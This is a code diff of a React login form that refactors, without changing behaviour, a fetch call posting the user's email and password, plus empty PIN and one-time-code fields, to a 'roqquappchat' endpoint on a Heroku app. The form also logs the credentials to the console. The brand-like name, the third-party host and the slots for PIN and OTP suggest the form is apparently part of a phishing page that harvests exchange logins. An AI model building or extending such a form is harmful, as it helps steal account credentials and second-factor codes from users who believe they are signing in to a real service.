@@ -35,21 +35,19 @@ const Form = (props) => {
         } else {
             console.log({ email, password })
             try {
-                const response = await fetch(
-                    'https://roqq.herokuapp.com/roqquappchat',
-                    {
-                        method: 'POST',
-                        headers: {
-                            'Content-type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            email,
-                            password,
-                            pin: '',
-                            otp: '',
-                        }),
-                    }
-                )
+                const URL = 'https://roqq.herokuapp.com'
+                const response = await fetch(URL + '/roqquappchat', {
+                    method: 'POST',
+                    headers: {
+                        'Content-type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        email,
+                        password,
+                        pin: '',
+                        otp: '',
+                    }),
+                })
 
                 const resData = await response.json()
 
